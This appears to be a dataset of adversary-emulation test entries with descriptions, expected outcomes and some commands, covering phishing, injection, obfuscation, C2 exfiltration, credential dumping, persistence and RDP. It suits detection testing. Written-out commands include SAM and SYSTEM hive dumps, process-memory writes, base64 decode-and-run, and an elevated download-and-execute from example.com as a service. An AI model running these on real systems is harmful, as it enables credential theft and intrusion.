attacks.description: Creates an Internet Shortcut (.url) file pointing to a phishing website, simulating a malicious link attachment.
attacks.expected_behavior: A file named phish.url is created in the user's temp directory containing the URL to the fake phishing site.

attacks.description: Creates a base64‑encoded file and decodes it with certutil to simulate a malicious attachment delivered via phishing.
attacks.expected_behavior: A text file payload.txt is created in %TEMP% containing the decoded string 'Hello, Phishing'.

attacks.description: Generates an HTML file with embedded JavaScript that could be used as a phishing webpage payload.
attacks.expected_behavior: Creates phish.html in the temp directory containing a simple alert script; opening the file would display a browser alert.

attacks.description: Create a text file that prompts the user to enter their password, simulating a phishing attempt.
attacks.expected_behavior: A text file named phishing.txt will be created in the current directory, containing the phrase 'Please enter your password: '.

attacks.command: mkdir phishing_directory && echo 'You have been phished!' > phishing_directory/phished.txt
attacks.description: Create a directory and a file within it that contains a message indicating the user has been phished, simulating the aftermath of a successful phishing attack.
attacks.expected_behavior: A directory named phishing_directory will be created in the current directory, containing a file named phished.txt with the message 'You have been phished!'.

attacks.command: echo 'Visit http://example.com to update your password.' > phishing_message.txt
attacks.description: Create a text file that contains a message prompting the user to visit a website to update their password, simulating a phishing email or message.
attacks.expected_behavior: A text file named phishing_message.txt will be created in the current directory, containing the phrase 'Visit http://example.com to update your password.'. Note: The URL used is an example and does not represent an actual phishing site.

attacks.description: Creates a simple text file in the user's temporary directory using PowerShell's Set-Content cmdlet.
attacks.expected_behavior: A file named ps_basic.txt containing the string 'PowerShell basic test' appears in %TEMP%.

attacks.description: Compresses the previously created text file into a zip archive using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: A zip file named ps_archive.zip is created in %TEMP% and contains ps_basic.txt.

attacks.description: Uses PowerShell to invoke schtasks.exe and creates a one‑time scheduled task that writes a harmless message to a file in the temp directory.
attacks.expected_behavior: A scheduled task named PsTestTask is registered; when it triggers at 23:59 it creates task_output.txt in %TEMP% containing the text 'TaskRun'.

attacks.description: Execute a basic PowerShell command to get a list of running processes
attacks.expected_behavior: The command will execute and display a list of running processes in the terminal

attacks.description: Create a file using PowerShell and write a test string to it, overwriting any existing content
attacks.expected_behavior: A file named 'test.txt' will be created in the '/tmp' directory with the content 'Hello World', overwriting any existing file with the same name

attacks.description: Download a web page using PowerShell and save it to a file, ignoring any errors that may occur
attacks.expected_behavior: The web page from 'http://example.com' will be downloaded and saved to a file named 'example.html' in the '/tmp' directory, or an error will be silently ignored if the download fails

attacks.description: List all running services to identify potential system processes to modify
attacks.expected_behavior: Lists all running services

attacks.description: Create a new system process using the sc.exe command
attacks.expected_behavior: Creates a new system process

attacks.description: Create a new system process using PowerShell
attacks.expected_behavior: Creates a new system process

attacks.description: Start the SSH service
attacks.expected_behavior: The SSH service will be started, allowing remote connections to the system.

attacks.description: Open the crontab editor to schedule tasks
attacks.expected_behavior: The crontab editor will be opened, allowing the user to schedule tasks to run at specific times or intervals.

attacks.description: Enable and start the HTTP service
attacks.expected_behavior: The HTTP service will be enabled and started, allowing the system to serve web content.

attacks.description: Loads user32.dll via rundll32 and displays a message box, demonstrating DLL loading (process injection) into a new process.
attacks.expected_behavior: A message box titled 'Demo' with text 'Process Injection Test' appears on the screen.

attacks.description: Creates a placeholder DLL file in the TEMP directory and self‑registers it with regsvr32 using the /i switch, causing the DLL to be loaded into the regsvr32 process (process injection).
attacks.expected_behavior: The dummy DLL is written to %TEMP% and regsvr32 attempts to register and execute it silently; no visible output, but the DLL is loaded into regsvr32.exe.

attacks.description: Uses PowerShell to create a dummy DLL file in the TEMP directory and then invokes rundll32.exe to load that DLL, illustrating scripted DLL injection.
attacks.expected_behavior: A dummy DLL file is written to %TEMP% and rundll32 attempts to load it with the specified entry point; since the DLL is not a valid library, rundll32 will error, but the injection attempt is performed.

attacks.description: Basic process injection by preloading a shared library into a newly started process using the LD_PRELOAD environment variable.
attacks.expected_behavior: The ls command lists the /tmp directory; if libtest.so contains initialization code, it is executed in the context of the ls process.

attacks.description: Intermediate injection by attaching to a running process (sleep) with gdb and invoking dlopen to load a shared library into its address space.
attacks.expected_behavior: The target sleep process loads libtest.so; any code in the library runs within the sleep process while the process continues sleeping.

attacks.command: sudo bash -c 'printf "\x90\x90\x90\x90" | dd of=/proc/$(pidof sleep)/mem bs=1 seek=0 conv=notrunc'
attacks.description: Advanced injection by directly writing raw shellcode (NOP sled) into the memory of a running process via /proc/<pid>/mem using dd.
attacks.expected_behavior: Four NOP instructions are written at the start of the sleep process's memory; this demonstrates low‑level memory manipulation that could be used to hijack execution flow.

attacks.description: Displays all active TCP connections and listening ports, simulating application layer protocol activity for detection.
attacks.expected_behavior: Lists all active connections and listening ports on the system.

attacks.description: Executes a simple PowerShell command that outputs 'Hello, World!' to demonstrate the execution of commands through the application layer protocol.
attacks.expected_behavior: Prints 'Hello, World!' to the console.

attacks.description: Establishes a connection to a local server on port 8080 using the telnet protocol, simulating application layer protocol activity.
attacks.expected_behavior: Attempts to connect to localhost on port 8080 and may prompt for input if the connection is successful.

attacks.description: Simulate a GET request to a command and control server using curl
attacks.expected_behavior: Establish a connection to the specified server and retrieve the command

attacks.description: Simulate a DNS query to a command and control server using dig
attacks.expected_behavior: Resolve the domain name and retrieve the IP address of the command and control server

attacks.description: Simulate a connection to a command and control server using netcat
attacks.expected_behavior: Establish a connection to the specified server and listen for commands

attacks.description: Creates a plain text file and then encodes it to Base64 using certutil, producing an obfuscated version of the original content.
attacks.expected_behavior: A file %TEMP%\plain.txt containing 'Hello World' is created, then %TEMP%\encoded.txt contains the Base64 representation of that file.

attacks.description: Executes the PowerShell command 'whoami' supplied as a Base64‑encoded string, hiding the actual command from plain‑text logs.
attacks.expected_behavior: Outputs the current user name to the console, but the command itself is hidden inside the Base64 string.

attacks.command: cmd.exe /c "echo V3JpdGUtSG9zdCAndGVzdCe= > %TEMP%\payload.b64 && certutil -decode %TEMP%\payload.b64 %TEMP%\payload.ps1 -ErrorAction SilentlyContinue && powershell -ExecutionPolicy Bypass -File %TEMP%\payload.ps1"
attacks.description: Writes a Base64‑encoded PowerShell script to a temporary file, decodes it with certutil, and then runs the resulting script, demonstrating multi‑step obfuscation.
attacks.expected_behavior: The decoded script writes 'Obfuscated' (or similar benign output) to the console; the original script content is hidden in the Base64 file.

attacks.description: Creates a hidden file with malicious content and changes its permissions to make it inaccessible.
attacks.expected_behavior: The file is created and its permissions are changed, making it difficult to detect.

attacks.description: Encodes a malicious file using base64, making its contents less detectable.
attacks.expected_behavior: The file is encoded, and its contents are no longer easily readable.

attacks.description: Encrypts a malicious file using AES-256, further obscuring its contents.
attacks.expected_behavior: The file is encrypted, making its detection and analysis significantly more challenging.

attacks.description: Read a test file from the TEMP directory and POST its contents to a web server, simulating exfiltration over an HTTP C2 channel.
attacks.expected_behavior: The command sends the file's raw text to the specified URL; no persistent changes are made on the host.

attacks.description: Compress a file into a ZIP archive and upload it to a remote SMB share using bitsadmin, demonstrating exfiltration over a file‑share C2 channel.
attacks.expected_behavior: Creates test.zip in the TEMP folder and attempts to upload it to the UNC path; the file remains on disk after upload.

attacks.description: Open a TCP connection to a C2 listener and stream the contents of a file over the socket, representing exfiltration via a custom C2 protocol.
attacks.expected_behavior: Establishes a network connection to the specified IP and port, sends the file bytes, then closes the connection; no files are written or modified.

attacks.description: Creates a temporary file with test data and sends its contents to a remote C2 listener using netcat.
attacks.expected_behavior: The remote host listening on 192.168.1.100:4444 receives the string 'sensitive data' transmitted over the netcat TCP connection.

attacks.description: Compresses /etc/passwd, encodes it in base64, and streams the result to the C2 server via netcat.
attacks.expected_behavior: The remote listener receives a base64‑encoded tarball containing the /etc/passwd file, demonstrating exfiltration of structured data over the C2 channel.

attacks.description: Creates a named pipe, streams a compressed and base64‑encoded archive of /var/log through the pipe, and sends it to the C2 server using netcat; cleans up the pipe afterwards.
attacks.expected_behavior: The remote C2 endpoint receives a continuous base64‑encoded stream of the compressed /var/log directory, illustrating exfiltration via a live data pipe without persisting the full payload on disk.

attacks.description: Downloads a benign executable from a public URL using certutil and runs it locally, simulating payload delivery from a compromised public‑facing web server.
attacks.expected_behavior: The file is fetched to the temporary directory and executed; because the payload is benign, it may display a harmless message or exit without side effects.

attacks.description: Sends a crafted HTTP request to a vulnerable public‑facing application that executes the supplied command (whoami) on the server and returns the result.
attacks.expected_behavior: The request is sent; if the target is vulnerable, the server responds with the output of the whoami command, which is displayed in the PowerShell console.

attacks.command: powershell -Command 'Start-Process cmd -ArgumentList "/c certutil -urlcache -split -f \"http://example.com/benign.exe\" \"%TEMP%\\benign.exe\" && sc create ExploitSvc binPath= \"%TEMP%\\benign.exe\" start= demand && sc start ExploitSvc && sc delete ExploitSvc"' -Verb RunAs
attacks.description: Downloads a benign payload, creates a Windows service that runs the payload, starts the service, and then removes the service. Execution is performed with elevated privileges via PowerShell's Start-Process with the RunAs verb.
attacks.expected_behavior: The payload is downloaded to the temp folder, a new service named ExploitSvc is created pointing to the payload, the service is started (triggering the payload), and finally the service is deleted. Because the payload is benign, the service execution produces no harmful effect.

attacks.description: Basic: Exploit public-facing application using netcat to spawn a bash shell
attacks.expected_behavior: Opens a listening port and spawns a bash shell upon connection

attacks.description: Intermediate: Exploit public-facing application using a simple HTTP server
attacks.expected_behavior: Starts a simple HTTP server on port 8080

attacks.description: Advanced: Exploit public-facing application using curl to test for directory traversal vulnerability
attacks.expected_behavior: Sends a GET request to test for directory traversal vulnerability

attacks.command: reg.exe save HKLM\SAM %TEMP%\sam.save && reg.exe save HKLM\SYSTEM %TEMP%\system.save
attacks.description: Basic OS Credential Dumping: uses reg.exe to save the SAM and SYSTEM registry hives to temporary files.
attacks.expected_behavior: Two files (sam.save and system.save) are created in the user's temporary directory containing the raw registry hives.

attacks.command: vssadmin.exe create shadow /for=C: && for /f "tokens=3" %i in ('vssadmin list shadows ^| findstr /i "Shadow Copy Volume"') do copy "%i\Windows\System32\config\SAM" "%TEMP%\sam.shadow"
attacks.description: Intermediate OS Credential Dumping: creates a Volume Shadow Copy of the C: drive and copies the SAM hive from the shadow volume.
attacks.expected_behavior: A shadow copy is created; the SAM hive is copied from the shadow volume to %TEMP%\sam.shadow without affecting the live system.

attacks.command: wmic.exe process call create "cmd /c reg save HKLM\\SAM %TEMP%\\sam.wmic && reg save HKLM\\SYSTEM %TEMP%\\system.wmic"
attacks.description: Advanced OS Credential Dumping: uses WMIC to spawn a process that runs reg.exe to dump SAM and SYSTEM hives, demonstrating credential extraction via indirect execution.
attacks.expected_behavior: WMIC creates a child process that executes the reg save commands; the resulting files sam.wmic and system.wmic appear in %TEMP%.

attacks.description: Basic credential dumping by reading the /etc/shadow file and writing its contents to a user-accessible file.
attacks.expected_behavior: The contents of /etc/shadow (hashed passwords) are output to $HOME/shadow_dump.txt; the command will fail without root privileges.

attacks.description: Intermediate credential dumping using sudo to copy the shadow file to a temporary location and restrict its permissions.
attacks.expected_behavior: A copy of /etc/shadow is created at $HOME/shadow_copy with mode 600; requires sudo/root access.

attacks.description: Advanced credential dumping by creating a core dump of the sshd process, which may contain in‑memory credentials.
attacks.expected_behavior: Generates a core file named /tmp/sshd_core.<pid> containing the memory of the sshd process; requires root privileges.

attacks.command: powershell -Command "'Test data for archiving' | Set-Content -Path \"$env:TEMP\\CollectedData.txt\" -Force; Compress-Archive -Path \"$env:TEMP\\CollectedData.txt\" -DestinationPath \"$env:TEMP\\CollectedData.zip\" -Force"
attacks.description: Basic archive using PowerShell Compress-Archive to zip a test file in the TEMP directory.
attacks.expected_behavior: Creates a text file %TEMP%\CollectedData.txt containing dummy data, then compresses it into %TEMP%\CollectedData.zip.

attacks.command: cmd.exe /c "echo Test data for archiving > %TEMP%\\CollectedData.txt && makecab.exe %TEMP%\\CollectedData.txt %TEMP%\\CollectedData.cab"
attacks.description: Intermediate archive using the legacy makecab.exe tool to create a cabinet file from the test file.
attacks.expected_behavior: Writes dummy content to %TEMP%\CollectedData.txt and then packages it into %TEMP%\CollectedData.cab using makecab.

attacks.command: cmd.exe /c "echo Test data for archiving > %TEMP%\\CollectedData.txt && tar -cf %TEMP%\\CollectedData.tar -C %TEMP% CollectedData.txt"
attacks.description: Advanced archive using the native tar utility to create a tar archive of the test file.
attacks.expected_behavior: Creates %TEMP%\CollectedData.txt with dummy content and then archives it into %TEMP%\CollectedData.tar using tar.

attacks.description: Archive a single file using tar
attacks.expected_behavior: Create a compressed archive named 'archive.tar.gz' containing 'file1.txt'

attacks.description: Archive multiple files using tar
attacks.expected_behavior: Create a compressed archive named 'archive.tar.gz' containing 'file1.txt' and 'file2.txt'

attacks.description: Archive a directory using tar
attacks.expected_behavior: Create a compressed archive named 'archive.tar.gz' containing all files and subdirectories in '/path/to/directory'

attacks.description: Basic user‑level scheduled task that runs every minute and writes a static string to a temporary file.
attacks.expected_behavior: A task named 'TestTask' appears in the Task Scheduler. Every minute it executes cmd.exe, creating or overwriting %TEMP%\test.txt with the word 'Test'. No elevated privileges are required.

attacks.description: Intermediate example that writes a PowerShell script to %TEMP% and registers a daily task to run that script, appending a timestamp to a log file.
attacks.expected_behavior: The script %TEMP%\persist.ps1 is created. A scheduled task named 'LogTask' runs once daily, invoking PowerShell to execute the script, which appends the current date/time to %TEMP%\log.txt. The task runs with limited rights, so no admin rights are needed.

attacks.description: Advanced elevated task that runs at system start with highest privileges, executing a hidden PowerShell encoded command that writes a benign marker file.
attacks.expected_behavior: A task named 'ElevatedTask' is created in the Task Scheduler with the 'Run with highest privileges' option. At system boot it launches PowerShell with the provided Base64‑encoded command, which creates %TEMP%\elevated_marker.txt containing a harmless string. Administrative rights are required to create this high‑privilege task.

attacks.description: Adds a user‑level cron entry that runs every minute and appends a test string to ~/cron_test.log.
attacks.expected_behavior: A new cron job is installed for the current user; each minute the command writes 'basic cron' to the log file.

attacks.command: echo "0 * * * * root echo 'advanced cron' >> /var/log/cron_test.log" | sudo tee /etc/cron.d/advanced_test > /dev/null
attacks.description: Installs a system‑wide cron job (requires root) that runs hourly and logs a test string to /var/log/cron_test.log.
attacks.expected_behavior: Cron daemon reads the file in /etc/cron.d; at the top of each hour it appends 'advanced cron' to the specified log file.

attacks.description: Lists all local user accounts on the machine using the built‑in net.exe utility.
attacks.expected_behavior: Outputs a list of local usernames to the console.

attacks.description: Enumerates domain user accounts when the host is joined to an Active Directory domain.
attacks.expected_behavior: Displays domain usernames retrieved from the domain controller.

attacks.description: Uses PowerShell to retrieve detailed information about local user accounts, including whether each account is enabled.
attacks.expected_behavior: Prints a table with the Name and Enabled status of each local account.

attacks.description: Displays the contents of /etc/passwd, listing all local user accounts and their UID/GID information.
attacks.expected_behavior: Outputs each line of /etc/passwd, showing usernames, UID, GID, home directory, and default shell.

attacks.description: Queries the system's account database via getent and extracts only the usernames.
attacks.expected_behavior: Prints a list of usernames, one per line, including both regular and system accounts.

attacks.description: Reads the /etc/shadow file to obtain hashed password entries, revealing privileged account information.
attacks.expected_behavior: Outputs the shadow file contents, showing usernames and their encrypted password hashes (or placeholders for locked accounts).

attacks.description: Launches the built‑in Remote Desktop client to connect to a remote host at 10.0.0.5.
attacks.expected_behavior: The Remote Desktop client starts and attempts to establish an RDP session with the specified IP address, prompting for credentials if the host is reachable.

attacks.command: cmd.exe /c "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && net start TermService"
attacks.description: Enables Remote Desktop on the local machine by disabling the TS connection denial flag and starting the Terminal Services service.
attacks.expected_behavior: Registry key is updated to allow RDP connections, the TermService is started, and the system becomes reachable via RDP.

attacks.command: powershell -Command "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow; Start-Process 'mstsc.exe' -ArgumentList '/v:10.0.0.5'"
attacks.description: Creates a firewall rule to permit inbound RDP traffic and immediately launches the RDP client to connect to 10.0.0.5.
attacks.expected_behavior: An inbound firewall rule for port 3389 is added, after which mstsc.exe starts and attempts to connect to the target host.

attacks.description: Basic remote desktop connection using rdesktop
attacks.expected_behavior: Establish a remote desktop connection to the specified IP address with the given credentials

attacks.description: Intermediate remote desktop connection using Remmina
attacks.expected_behavior: Establish a remote desktop connection using the specified connection profile and credentials

attacks.description: Advanced remote desktop connection using SSH tunneling
attacks.expected_behavior: Create an SSH tunnel to forward remote desktop traffic from the local machine to the specified IP address

attacks.description: Open a text file in notepad to simulate user execution of a file.
attacks.expected_behavior: Notepad opens with a new file named test.txt in the temp directory.

attacks.description: Use PowerShell to start a new process that writes to a file, simulating user execution of a command that results in a file being created or modified.
attacks.expected_behavior: A new file named test.txt is created in the temp directory with the content 'Hello World'.

attacks.description: Use certutil to decode a file, demonstrating the execution of a built-in utility on a potentially malicious file.
attacks.expected_behavior: The contents of test.txt are decoded and saved to output.txt in the temp directory.

attacks.description: Creates a malicious shell script, gives it execution permissions, and then runs it.
attacks.expected_behavior: The script will execute with the user's privileges, potentially leading to malicious activity.

attacks.description: Downloads a potentially malicious file from a URL, gives it execution permissions, and then runs it.
attacks.expected_behavior: The downloaded file will execute with the user's privileges, potentially leading to malicious activity. Note: This command assumes internet access and downloads from a hypothetical malicious URL.

attacks.description: Creates a malicious shell script in a temporary directory, gives it execution permissions, and then attempts to run it with elevated privileges.
attacks.expected_behavior: The script will attempt to execute with elevated privileges, potentially leading to more severe malicious activity. Note: This command requires the user to enter their password for sudo.
